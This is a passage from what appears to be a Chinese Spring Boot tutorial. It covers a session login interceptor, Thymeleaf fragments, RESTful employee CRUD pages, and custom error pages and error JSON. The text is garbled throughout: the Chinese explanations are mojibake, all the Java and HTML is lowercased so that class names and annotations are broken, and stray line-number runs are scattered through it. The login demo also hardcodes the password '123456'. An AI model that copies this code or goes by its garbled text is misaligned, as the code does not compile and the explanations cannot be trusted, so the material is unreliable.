6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   \n\n * ç»å½æ¦æªå¨æºå¶\n   \n   // ç»å½æ·»å cookie\n   package com.pwddd.springboot.controller;\n   \n   import org.springframework.stereotype.controller;\n   import org.springframework.util.stringutils;\n   import org.springframework.web.bind.annotation.getmapping;\n   import org.springframework.web.bind.annotation.postmapping;\n   import org.springframework.web.bind.annotation.requestmapping;\n   import org.springframework.web.bind.annotation.requestparam;\n   \n   import javax.servlet.http.httpsession;\n   import java.util.map;\n   \n   @controller\n   @requestmapping("/user")\n   public class usercontroller {\n   \n       @postmapping("/login")\n       public string login(httpsession httpsession,\n                           @requestparam("username") string username, @requestparam("password") string password, map<string,object> map){\n           if (!stringutils.isempty(username) && !stringutils.isempty(password) && password.equals("123456")){\n               httpsession.setattribute("username",username);\n               return "redirect:/main";\n           }else {\n               map.put("msg","ç»éå¤±è´¥ï¼è¯·ç¡®è®¤ç¨æ·åå¯ç æ¯å¦æ­£ç¡®~");\n               return "login";\n           }\n       }\n   }\n   \n   \n   // è®¾ç½®æ¦æªå¨\n   package com.pwddd.springboot.component;\n   \n   import org.springframework.util.stringutils;\n   import org.springframework.web.servlet.handlerinterceptor;\n   import org.springframework.web.servlet.modelandview;\n   \n   import javax.servlet.http.httpservletrequest;\n   import javax.servlet.http.httpservletresponse;\n   import javax.servlet.http.httpsession;\n   \n   public class loginhandlerinterceptor implements handlerinterceptor {\n       @override\n       public boolean prehandle(httpservletrequest httpservletrequest, httpservletresponse httpservletresponse, object o) throws exception {\n           // ä»sessionè·åä¿¡æ¯\n           httpsession session = httpservletrequest.getsession();\n           string username = (string) session.getattribute("username");\n           if (stringutils.isempty(username)){\n               httpservletrequest.setattribute("msg","æ²¡ææéä½¿ç¨~");\n               httpservletrequest.getrequestdispatcher("/index").forward(httpservletrequest,httpservletresponse);\n   \n               return false;\n           }else {\n               return true;\n           }\n       }\n   \n       @override\n       public void posthandle(httpservletrequest httpservletrequest, httpservletresponse httpservletresponse, object o, modelandview modelandview) throws exception {\n   \n       }\n   \n       @override\n       public void aftercompletion(httpservletrequest httpservletrequest, httpservletresponse httpservletresponse, object o, exception e) throws exception {\n   \n       }\n   }\n   \n   \n   // æ·»å å°å®¹å¨\n   @override\n   public void addinterceptors(interceptorregistry registry) {\n       registry.addinterceptor(new loginhandlerinterceptor())\n           .addpathpatterns("/**")\n           .excludepathpatterns("/login","/index","/user/login");\n   }\n   \n   springbootå·²ç»åå¥½äºéæèµæºæ å°ï¼å æ­¤ä¸éè¦æä»¬è¿è¡å¤çã\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   35\n   36\n   37\n   38\n   39\n   40\n   41\n   42\n   43\n   44\n   45\n   46\n   47\n   48\n   49\n   50\n   51\n   52\n   53\n   54\n   55\n   56\n   57\n   58\n   59\n   60\n   61\n   62\n   63\n   64\n   65\n   66\n   67\n   68\n   69\n   70\n   71\n   72\n   73\n   74\n   75\n   76\n   77\n   78\n   79\n   80\n   \n\n# 4. å¬å±é¡µé¢æ½ååé«äº®å¤ç\n\næ½åå¬å±çæ®µ\n<div th:fragment="copy">\n&copy; 2011 the good thymes virtual grocery\n</div>\n2ãå¼å¥å¬å±çæ®µ\n<div th:insert="~{footer :: copy}"></div>\n~{templatename::selector}ï¼æ¨¡æ¿å::éæ©å¨\n~{templatename::fragmentname}:æ¨¡æ¿å::çæ®µå\n3ãé»è®¤ææï¼\ninsertçå¬å±çæ®µå¨divæ ç­¾ä¸­\nå¦æä½¿ç¨th:insertç­å±æ§è¿è¡å¼å¥ï¼å¯ä»¥ä¸ç¨å~{}ï¼\nè¡ååæ³å¯ä»¥å ä¸ï¼[[~{}]];[(~{})]ï¼\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nä¸ç§å¼å¥å¬å±çæ®µçthå±æ§ï¼\n\n * th:insertï¼å°å¬å±çæ®µæ´ä¸ªæå¥å°å£°æå¼å¥çåç´ ä¸­\n * th:replaceï¼å°å£°æå¼å¥çåç´ æ¿æ¢ä¸ºå¬å±çæ®µ\n * th:includeï¼å°è¢«å¼å¥ççæ®µçåå®¹åå«è¿è¿ä¸ªæ ç­¾ä¸­\n\n<footer th:fragment="copy">\n    &copy; 2011 the good thymes virtual grocery\n</footer>\nå¼å¥æ¹å¼\n<div th:insert="footer :: copy"></div>\n<div th:replace="footer :: copy"></div>\n<div th:include="footer :: copy"></div>\nææ\n<div>\n    <footer>\n        &copy; 2011 the good thymes virtual grocery\n    </footer>\n</div>\n<footer>\n    &copy; 2011 the good thymes virtual grocery\n</footer>\n<div>\n    &copy; 2011 the good thymes virtual grocery\n</div>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\næ½åæ¹å¼ï¼å°ææçå¬å±é¡µé¢æ¾å°templatesç®å½ä¸çcommonä¸­ï¼å¨å¯»æ¾çæ®µæ¶ä¹ä¼å»éµå¾ªæ¨¡æ¿çæ å°ã\n\n<nav th:fragment="navbar" class="navbar navbar-dark sticky-top bg-dark flex-md-nowrap p-0">\n    <a class="navbar-brand col-sm-3 col-md-2 mr-0" href="http://getbootstrap.com/docs/4.0/examples/dashboard/#">[[${session.username}]]</a>\n    <input class="form-control form-control-dark w-100" type="text" placeholder="search" aria-label="search">\n    <ul class="navbar-nav px-3">\n        <li class="nav-item text-nowrap">\n            <a class="nav-link" href="http://getbootstrap.com/docs/4.0/examples/dashboard/#">sign out</a>\n        </li>\n    </ul>\n</nav>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¼å¥æ¹å¼ï¼\n\n<div th:replace="common/bar :: navbar" ></div>\n\t\x3c!--ä½¿ç¨éæ©å¨å¼å¥ï¼--\x3e\n<div th:replace="common/bar :: #sidebar" ></div>\n\n\n1\n2\n3\n\n\nå¨æä»¬çé¡µé¢ä¸­ï¼å½æä»¬éæ©åå·¥ç®¡çæ¶ï¼ä¾§è¾¹æ å¹¶æ²¡æé«äº®å°åå·¥ç®¡çæ ç­¾ï¼bootstrapä¸­ä½¿ç¨activeå±æ§æ¥æ§å¶æ ç­¾æ¯å¦é«äº®ã\n\næä»¬å¯ä»¥ä½¿ç¨åæ°åççæ®µç­¾åæ¥å¨æçæå®æ ç­¾ï¼\n\nå¨å¼å¥çæ®µæ¶ä¼ å¥åæ°ï¼å¨é¡µé¢ä¸å¤æ­åæ°ï¼å¨ææ·»å activeã\n\n<a class="nav-link" th:class="${activeuri == \'emps\' ? \'nav-link active\' : \'nav-link\'}"\n   th:href="@{/emps}">\n    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-users">\n        <path d="m17 21v-2a4 4 0 0 0-4-4h5a4 4 0 0 0-4 4v2"></path>\n        <circle cx="9" cy="7" r="4"></circle>\n        <path d="m23 21v-2a4 4 0 0 0-3-3.87"></path>\n        <path d="m16 3.13a4 4 0 0 1 0 7.75"></path>\n    </svg>\n    åå·¥ç®¡ç\n</a>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nå¨å¼å¥çæ¶åæå®åæ°ï¼\n\n<div th:replace="common/bar :: #sidebar(acitveurl=\'main\')" ></div>\n\n\n1\n\n\n# 5.restfulè¯·æ±\n\nå®éªåè½                 è¯·æ±uri   è¯·æ±æ¹å¼\næ¥è¯¢ææåå·¥               emps    get\næ¥è¯¢æä¸ªåå·¥(æ¥å°ä¿®æ¹é¡µé¢)       emp/1   get\næ¥å°æ·»å é¡µé¢               emp     get\næ·»å åå·¥                 emp     post\næ¥å°ä¿®æ¹é¡µé¢ï¼æ¥åºåå·¥è¿è¡ä¿¡æ¯åæ¾ï¼   emp/1   get\nä¿®æ¹åå·¥                 emp     put\nå é¤åå·¥                 emp/1   delete\n\n * æ¥è¯¢å¨é¨åå·¥ä¿¡æ¯\n   \n   @getmapping("/emps")\n   public string emplist(model model){\n       collection<employee> employees = employeedao.getall();\n       model.addattribute("emps",employees);\n       return "emp/list";\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n   \n   <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">\n       <h2>åå·¥åè¡¨</h2>\n       <a class="btn btn-secondary btn-success">æ°å¢</a>\n   \n       <div class="table-responsive">\n           <table class="table table-striped table-sm">\n               <thead>\n                   <tr>\n                       <th>#</th>\n                       <th>å§å</th>\n                       <th>é®ç®±</th>\n                       <th>æ§å«</th>\n                       <th>çæ¥</th>\n                       <th>é¨é¨</th>\n                       <th>æä½</th>\n                   </tr>\n               </thead>\n               <tbody>\n                   <tr th:each="emp:${emps}">\n                       <td th:text="${emp.id}"></td>\n                       <td th:text="${emp.lastname}"></td>\n                       <td th:text="${emp.email}"></td>\n                       <td th:text="${emp.gender} == 0? \'å¥³\':\'ç·\'"></td>\n                       <td th:text="${#dates.format(emp.birth,\'yyyy-mm-dd\')}"></td>\n                       <td th:text="${emp.department.departmentname}"></td>\n                       <td>\n                           <button class="btn btn-sm btn-primary">ä¿®æ¹</button>\n                           <button class="btn btn-sm btn-danger">å é¤</button>\n                       </td>\n                   </tr>\n               </tbody>\n           </table>\n       </div>\n   </main>\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   \n\n * åå·¥æ·»å æä½\n   \n   <a class="btn btn-secondary btn-success" th:href="@{/emp}">æ°å¢</a>\n   \n   \n   1\n   \n   \n   <!doctype html>\n   \x3c!-- saved from url=(0052)http://getbootstrap.com/docs/4.0/examples/dashboard/ --\x3e\n   <html lang="en" xmlns:th="http://www.thymeleaf.org">\n   \n       <head>\n           <meta http-equiv="content-type" content="text/html; charset=utf-8">\n           <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">\n           <meta name="description" content="">\n           <meta name="author" content="">\n   \n           <title>dashboard template for bootstrap</title>\n           \x3c!-- bootstrap core css --\x3e\n           <link href="asserts/css/bootstrap.min.css" th:href="@{/webjars/bootstrap/4.0.0/css/bootstrap.css}" rel="stylesheet">\n   \n           \x3c!-- custom styles for this template --\x3e\n           <link href="asserts/css/dashboard.css" th:href="@{/asserts/css/dashboard.css}" rel="stylesheet">\n           <style type="text/css">\n               /* chart.js */\n   \n               @-webkit-keyframes chartjs-render-animation {\n                   from {\n                       opacity: 0.99\n                   }\n                   to {\n                       opacity: 1\n                   }\n               }\n   \n               @keyframes chartjs-render-animation {\n                   from {\n                       opacity: 0.99\n                   }\n                   to {\n                       opacity: 1\n                   }\n               }\n   \n               .chartjs-render-monitor {\n                   -webkit-animation: chartjs-render-animation 0.001s;\n                   animation: chartjs-render-animation 0.001s;\n               }\n           </style>\n       </head>\n   \n       <body>\n           \x3c!--å¼å¥æ½åçtopbar--\x3e\n           \x3c!--æ¨¡æ¿åï¼ä¼ä½¿ç¨thymeleafçååç¼éç½®è§åè¿è¡è§£æ--\x3e\n           <div th:replace="common/bar::navbar"></div>\n   \n           <div class="container-fluid">\n               <div class="row">\n                   \x3c!--å¼å¥ä¾§è¾¹æ --\x3e\n                   <div th:replace="common/bar::#sidebar(activeuri=\'emps\')"></div>\n   \n                   <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">\n                       \x3c!--éè¦åºåæ¯åå·¥ä¿®æ¹è¿æ¯æ·»å ï¼--\x3e\n                       <form th:action="@{/emp}" method="post">\n                           \x3c!--åéputè¯·æ±ä¿®æ¹åå·¥æ°æ®--\x3e\n                           \x3c!--\n   1ãspringmvcä¸­éç½®hiddenhttpmethodfilter;ï¼springbootèªå¨éç½®å¥½çï¼\n   2ãé¡µé¢åå»ºä¸ä¸ªpostè¡¨å\n   3ãåå»ºä¸ä¸ªinputé¡¹ï¼name="_method";å¼å°±æ¯æä»¬æå®çè¯·æ±æ¹å¼\n   --\x3e\n                           <input type="hidden" name="_method" value="put" th:if="${emp!=null}"/>\n                           <input type="hidden" name="id" th:if="${emp!=null}" th:value="${emp.id}">\n                           <div class="form-group">\n                               <label>lastname</label>\n                               <input name="lastname" type="text" class="form-control" placeholder="zhangsan" th:value="${emp!=null}?${emp.lastname}">\n                           </div>\n                           <div class="form-group">\n                               <label>email</label>\n                               <input name="email" type="email" class="form-control" placeholder="zhangsan@atguigu.com" th:value="${emp!=null}?${emp.email}">\n                           </div>\n                           <div class="form-group">\n                               <label>gender</label><br/>\n                               <div class="form-check form-check-inline">\n                                   <input class="form-check-input" type="radio" name="gender" value="1" th:checked="${emp!=null}?${emp.gender==1}">\n                                   <label class="form-check-label">ç·</label>\n                               </div>\n                               <div class="form-check form-check-inline">\n                                   <input class="form-check-input" type="radio" name="gender" value="0" th:checked="${emp!=null}?${emp.gender==0}">\n                                   <label class="form-check-label">å¥³</label>\n                               </div>\n                           </div>\n                           <div class="form-group">\n                               <label>department</label>\n                               \x3c!--æäº¤çæ¯é¨é¨çid--\x3e\n                               <select class="form-control" name="department.id">\n                                   <option th:selected="${emp!=null}?${dept.id == emp.department.id}" th:value="${dept.id}" th:each="dept:${depts}" th:text="${dept.departmentname}">1</option>\n                               </select>\n                           </div>\n                           <div class="form-group">\n                               <label>birth</label>\n                               <input name="birth" type="text" class="form-control" placeholder="zhangsan" th:value="${emp!=null}?${#dates.format(emp.birth, \'yyyy-mm-dd hh:mm\')}">\n                           </div>\n                           <button type="submit" class="btn btn-primary" th:text="${emp!=null}?\'ä¿®æ¹\':\'æ·»å \'">æ·»å </button>\n                       </form>\n                   </main>\n               </div>\n           </div>\n   \n           \x3c!-- bootstrap core javascript\n   ================================================== --\x3e\n           \x3c!-- placed at the end of the document so the pages load faster --\x3e\n           <script type="text/javascript" src="asserts/js/jquery-3.2.1.slim.min.js" th:src="@{/webjars/jquery/3.3.1/jquery.js}"><\/script>\n           <script type="text/javascript" src="asserts/js/popper.min.js" th:src="@{/webjars/popper.js/1.11.1/dist/popper.js}"><\/script>\n           <script type="text/javascript" src="asserts/js/bootstrap.min.js" th:src="@{/webjars/bootstrap/4.0.0/js/bootstrap.js}"><\/script>\n   \n           \x3c!-- icons --\x3e\n           <script type="text/javascript" src="asserts/js/feather.min.js" th:src="@{/asserts/js/feather.min.js}"><\/script>\n           <script>\n               feather.replace()\n           <\/script>\n   \n       </body>\n   \n   </html>\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   35\n   36\n   37\n   38\n   39\n   40\n   41\n   42\n   43\n   44\n   45\n   46\n   47\n   48\n   49\n   50\n   51\n   52\n   53\n   54\n   55\n   56\n   57\n   58\n   59\n   60\n   61\n   62\n   63\n   64\n   65\n   66\n   67\n   68\n   69\n   70\n   71\n   72\n   73\n   74\n   75\n   76\n   77\n   78\n   79\n   80\n   81\n   82\n   83\n   84\n   85\n   86\n   87\n   88\n   89\n   90\n   91\n   92\n   93\n   94\n   95\n   96\n   97\n   98\n   99\n   100\n   101\n   102\n   103\n   104\n   105\n   106\n   107\n   108\n   109\n   110\n   111\n   112\n   113\n   114\n   115\n   116\n   117\n   118\n   \n   \n   @getmapping("/emp")\n   public string emppage(model model){\n       collection<department> departments = departmentdao.getdepartments();\n       model.addattribute("depts",departments);\n       return "emp/add";\n   }\n   \n   @postmapping("/emp")\n   public string save(employee employee){\n       employeedao.save(employee);\n       return "redirect:/emps";\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   \n   \n   æäº¤æ¶å¦æåºç°400éè¯¯è¯´æç±»åè½¬ååºç°äºé®é¢ï¼é»è®¤æç§yyyy/mm/ddè¿è¡æ ¼å¼åã\n   \n   \n\n@bean\n@conditionalonproperty(prefix = "spring.mvc", name = "date-format")\npublic formatter<date> dateformatter() {\n    return new dateformatter(this.mvcproperties.getdateformat());\n}\n\npublic string getdateformat() {\n    return this.dateformat;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\néè¦å¨éç½®æä»¶ä¸­éç½®æ ¼å¼åæ¥æçæ ¼å¼ï¼spring.mvc.date-format: yyyy-mm-dd\n\n * åå·¥ä¿®æ¹é¡µé¢\n   \n   <a class="btn btn-sm btn-primary" th:href="@{/emp/}+${emp.id}">ä¿®æ¹</a>\n   \n   \n   \n   1\n   2\n   \n   \n   å ä¸ºåå·¥ä¿®æ¹é¡µé¢ååå·¥æ·»å é¡µé¢ç»æç±»ä¼¼ï¼å æ­¤å¯ä»¥å¤ç¨ä¸ä¸ªé¡µé¢ã\n   \n   /**\n        * æ¥å°updateé¡µé¢\n        * @param id\n        * @return\n        */\n   @getmapping("/emp/{id}")\n   public string update(@pathvariable("id")integer id,model model){\n       collection<department> departments = departmentdao.getdepartments();\n       model.addattribute("depts",departments);\n       employee employee = employeedao.get(id);\n       model.addattribute("emp",employee);\n       return "emp/add";\n   }\n   \n   @putmapping("/emp")\n   public string update(employee employee){\n       employeedao.save(employee);\n       return "redirect:/emps";\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   \n   \n   æ³¨æï¼ æäº¤putè¯·æ±æ¶ï¼éè¦éç½®httphiddenmethodfilterï¼å¹¶ä¸éèinputæ¡nameä¸º"_method"ï¼valueä¸ºæäº¤æ¹æ³ã\n\n * å é¤åå·¥ä¿¡æ¯\n   \n   é¡µé¢æ·»å å é¤è¡¨åãä¸é¢çè¿ç§æ·»å æ¹å¼ä¼å½±åé¡µé¢çå¸å±\n   \n   <form th:action="@{/emp}+${emp.id}" method="post">\n       <input type="hidden" name="_method" value="delete">\n       <button class="btn btn-sm btn-danger" type="submit">å é¤</button>\n   </form>\n   \n   \n   1\n   2\n   3\n   4\n   \n\næå¥½æ¯æ¹æä¸é¢çæ¹å¼ï¼\n\n<button th:attr="del_uri=@{/emp/}+${emp.id}" class="btn btn-sm btn-danger deletebtn">å é¤</button>\n\n\n<form id="deleteempform"  method="post">\n    <input type="hidden" name="_method" value="delete"/>\n</form>\n\n<script>\n\t$(".deletebtn").click(function(){\n\t\t//å é¤å½ååå·¥ç\n\t\t$("#deleteempform").attr("action",$(this).attr("del_uri")).submit();\n\t\treturn false;\n\t});\n<\/script>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# spring éè¯¯å¤çæºå¶\n\n# éè¯¯æºå¶åç\n\nspringbootå¨åºéæ¶ï¼å®¢æ·ç«¯ãæå¡å¨ï¼é½ä¼è¿åä¸ä¸ªé»è®¤çé¡µé¢æèé»è®¤çjsonæ°æ®ãä¸»è¦æ¯ç±mvcerrorautoconfigurationè¿è¡èªå¨éç½®çãæä»¬éè¦å®å¶è¿åçæ°æ®åé¡µé¢ã\n\nmvcerrorautoconfigurationç»å®¹å¨ä¸­æ·»å äºä»¥ä¸çç»ä»¶ï¼\n\n * defaulterrorattributes\n   \n   // å¸®æä»¬å¨é¡µé¢è·åä¿¡æ¯\n       @override\n   public map<string, object> geterrorattributes(requestattributes requestattributes,\n                                                 boolean includestacktrace) {\n       map<string, object> errorattributes = new linkedhashmap<string, object>();\n       errorattributes.put("timestamp", new date());\n       addstatus(errorattributes, requestattributes);\n       adderrordetails(errorattributes, requestattributes, includestacktrace);\n       addpath(errorattributes, requestattributes);\n       return errorattributes;\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   \n\n * basicerrorcontroller\n   \n   @controller\n   @requestmapping("${server.error.path:${error.path:/error}}")\n   public class basicerrorcontroller extends abstracterrorcontroller {\n       @requestmapping(produces = "text/html")//äº§çhtmlç±»åçæ°æ®ï¼æµè§å¨åéçè¯·æ±æ¥å°è¿ä¸ªæ¹æ³å¤ç\n       public modelandview errorhtml(httpservletrequest request,\n                                     httpservletresponse response) {\n           httpstatus status = getstatus(request);\n           map<string, object> model = collections.unmodifiablemap(geterrorattributes(\n               request, isincludestacktrace(request, mediatype.text_html)));\n           response.setstatus(status.value());\n           //å»åªä¸ªé¡µé¢ä½ä¸ºéè¯¯é¡µé¢ï¼åå«é¡µé¢å°ååé¡µé¢åå®¹\n           modelandview modelandview = resolveerrorview(request, response, status, model);\n           return (modelandview == null ? new modelandview("error", model) : modelandview);\n       }\n       @requestmapping\n       @responsebody //äº§çjsonæ°æ®ï¼å¶ä»å®¢æ·ç«¯æ¥å°è¿ä¸ªæ¹æ³å¤çï¼\n       public responseentity<map<string, object>> error(httpservletrequest request) {\n           map<string, object> body = geterrorattributes(request,\n                                                         isincludestacktrace(request, mediatype.all));\n           httpstatus status = getstatus(request);\n           return new responseentity<map<string, object>>(body, status);\n       }\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   \n\n * errorpagecustomizer\n   \n   @value("${error.path:/error}")\n   private string path = "/error"; ç³»ç»åºç°éè¯¯ä»¥åæ¥å°errorè¯·æ±è¿è¡å¤çï¼ï¼web.xmlæ³¨åçéè¯¯é¡µ\n       é¢è§åï¼\n   \n   \n   1\n   2\n   3\n   \n\n * defaulterrorviewresolver\n   \n   @override\n   public modelandview resolveerrorview(httpservletrequest request, httpstatus status,\n                                        map<string, object> model) {\n       modelandview modelandview = resolve(string.valueof(status), model);\n       if (modelandview == null && series_views.containskey(status.series())) {\n           modelandview = resolve(series_views.get(status.series()), model);\n       }\n       return modelandview;\n   }\n   private modelandview resolve(string viewname, map<string, object> model) {\n       //é»è®¤springbootå¯ä»¥å»æ¾å°ä¸ä¸ªé¡µé¢ï¼ error/404\n       string errorviewname = "error/" + viewname;\n       //æ¨¡æ¿å¼æå¯ä»¥è§£æè¿ä¸ªé¡µé¢å°åå°±ç¨æ¨¡æ¿å¼æè§£æ\n       templateavailabilityprovider provider = this.templateavailabilityproviders\n           .getprovider(errorviewname, this.applicationcontext);\n       if (provider != null) {\n           //æ¨¡æ¿å¼æå¯ç¨çæåµä¸è¿åå°errorviewnameæå®çè§å¾å°å\n           return new modelandview(errorviewname, model);\n       }\n       //æ¨¡æ¿å¼æä¸å¯ç¨ï¼å°±å¨éæèµæºæä»¶å¤¹ä¸æ¾errorviewnameå¯¹åºçé¡µé¢ error/404.html\n       return resolveresource(errorviewname, model);\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   \n\nä¸ä½ç³»ç»åºç°4xxæè5xxä¹ç±»çéè¯¯ï¼errorpagecustomizerå°±ä¼çæï¼å®å¶éè¯¯çååºè§åï¼ï¼å°±ä¼æ¥å°/errorè¯·æ±ï¼å°±ä¼è¢«basicerrorcontrollerå¤çã\n\nå³äºååºé¡µé¢ï¼å»åªä¸ªé¡µé¢æ¯ç±defaulterrorviewresolverè§£æå¾å°çã\n\nprotected modelandview resolveerrorview(httpservletrequest request,\n                                        httpservletresponse response, httpstatus status, map<string, object> model) {\n    //ææçerrorviewresolverå¾å°modelandview\n    for (errorviewresolver resolver : this.errorviewresolvers) {\n        modelandview modelandview = resolver.resolveerrorview(request, status, model);\n        if (modelandview != null) {\n            return modelandview;\n        }\n    }\n    return null;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# å®å¶éè¯¯é¡µé¢\n\nææ¨¡æ¿å¼æçæåµä¸ï¼å°éè¯¯é¡µé¢å½åä¸ºéè¯¯ç¶æç .htmlï¼æ¾å¨æ¨¡æ¿å¼ææä»¶å¤¹éé¢çerroræä»¶å¤¹ä¸ãæä»¬å¯ä»¥ä½¿ç¨4xxå5xxä½ä¸ºéè¯¯é¡µé¢çæä»¶åæ¥å¹éè¿ç§ç±»åçææéè¯¯ï¼ç²¾ç¡®ä¼åï¼ä¼åå¯»æ¾ç²¾ç¡®çç¶æç .htmlï¼ã\n\næ²¡ææ¨¡æ¿å¼æï¼æ¨¡æ¿å¼ææ¾ä¸å°è¿ä¸ªéè¯¯é¡µé¢ï¼ï¼éæèµæºæä»¶å¤¹ä¸æ¾ï¼éæèµæºæä»¶å¤¹ä¸çä¸ä¼è¢«æ¨¡æ¿å¼æè§£æ ãä»¥ä¸é½æ²¡æéè¯¯é¡µé¢ï¼å°±æ¯é»è®¤æ¥å°springbooté»è®¤çéè¯¯æç¤ºé¡µé¢ã\n\næä»¬è½å¨é¡µé¢è·åçä¿¡æ¯æ¯ï¼\n\n * timestampï¼æ¶é´æ³\n * statusï¼ç¶æç \n * errorï¼éè¯¯æç¤º\n * exceptionï¼å¼å¸¸å¯¹è±¡\n * messageï¼å¼å¸¸æ¶æ¯\n * errorsï¼jsr303æ°æ®æ ¡éªçéè¯¯\n\n# å®å¶éè¯¯çjsonæ°æ®\n\n 1. èªå®ä¹å¼å¸¸å¤çå¨\n    \n    package com.pwddd.springboot.exception;\n    \n    import org.springframework.web.bind.annotation.controlleradvice;\n    import org.springframework.web.bind.annotation.exceptionhandler;\n    import org.springframework.web.bind.annotation.responsebody;\n    \n    import java.util.hashmap;\n    import java.util.map;\n    \n    @controlleradvice\n    public class myexceptionhandler {\n    \n        @responsebody\n        @exceptionhandler(usernotexistexception.class)\n        public map<string,object> handleexception(exception e){\n            hashmap<string, object> map = new hashmap<>();\n            map.put("code",404);\n            map.put("msg","ç¨æ·ä¸å­å¨");\n            return map;\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 2. ä»¥ä¸çä»£ç è½ç¶å¯ä»¥è¿åjsonæ°æ®ï¼ä½æ¯ï¼æµè§å¨è®¿é®ä¹è¿åjsonæ°æ®ãæä»¬éè¦è½¬åå°errorä¸ï¼å®æèªéåºå¤çå¨\n    \n    @exceptionhandler(usernotexistexception.class)\n    public string handleexception(exception e){\n        hashmap<string, object> map = new hashmap<>();\n        map.put("code",404);\n        map.put("msg","ç¨æ·ä¸å­å¨");\n        //        return map;\n        return "redirect:/error";\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n 3. è½¬å°errorä¹åï¼å ä¸ºæä»¬çéè¯¯ç¶æç é®é¢ï¼å¯¼è´æ²¡æå¯¹åºçéè¯¯é¡µé¢ï¼å æ­¤æ¾ç¤ºè¿æ¯é»è®¤çç©ºç½é¡µãæä»¬éè¦ä¼ å¥é»è®¤çç¶æç \n    \n    @exceptionhandler(usernotexistexception.class)\n    public string handleexception(exception e, httpservletrequest request){\n        hashmap<string, object> map = new hashmap<>();\n        request.setattribute("javax.servlet.error.status_code",400);\n        map.put("code",404);\n        map.put("msg","ç¨æ·ä¸å­å¨");\n        //        return map;\n        return "redirect:/error";\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 4. æä»¬å®å¶çæ°æ®è¿æ ·æºå¸¦ä¸åºå»ï¼æä»¬éè¦å°å®å¶çæ°æ®æºå¸¦åºå»ãç¸åºçæ°æ®æ¯ç±geterrorattributesè·åçãæä»¬æ³è¦å®å¶çè¯ï¼æä»¬å¯ä»¥å®å¨ç¼åä¸ä¸ªå®ç°ç±»ï¼å®å¨æ¿ä»£ãä½æ¯è¿æ ·å¤ªéº»ç¦äºï¼æä»¬å¯ä»¥ç»§æ¿å¹¶éåç¸åºçæ¹æ³ãé¡µé¢ä¸è½ç¨çæ°æ®ï¼æèæ¯jsonè¿åè½ç¨çæ°æ®é½æ¯éè¿errorattributes.geterrorattributeså¾å°ãå®¹å¨ä¸­defaulterrorattributes.geterrorattributes()é»è®¤è¿è¡æ°æ®å¤çç\n    \n    //ç»å®¹å¨ä¸­å å¥æä»¬èªå·±å®ä¹çerrorattributes\n    @component\n    public class myerrorattributes extends defaulterrorattributes {\n        @override\n        public map<string, object> geterrorattributes(requestattributes requestattributes,\n                                                      boolean includestacktrace) {\n            map<string, object> map = super.geterrorattributes(requestattributes,\n                                                               includestacktrace);\n            //requestattributes.getattributes("ext",0);   // è·åå¼å¸¸å¤çå¨çæ°æ®ã\n            map.put("company","atguigu");\n            return map;\n        }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    \n    \n    æç»çææï¼ååºæ¯èªéåºçï¼å¯ä»¥éè¿å®å¶errorattributesæ¹åéè¦è¿åçåå®¹ã\n\n\n# åµå¥å¼webå®¹å¨\n\nspringbooté»è®¤ä½¿ç¨tomcatä½ä¸ºåµå¥å¼çservletå®¹å¨ãæä»¬éè¦èèï¼å®å¶éç½®ãåæ¢å¶ä»çå®¹å¨ã\n\n\n\n# å®å¶tomcaté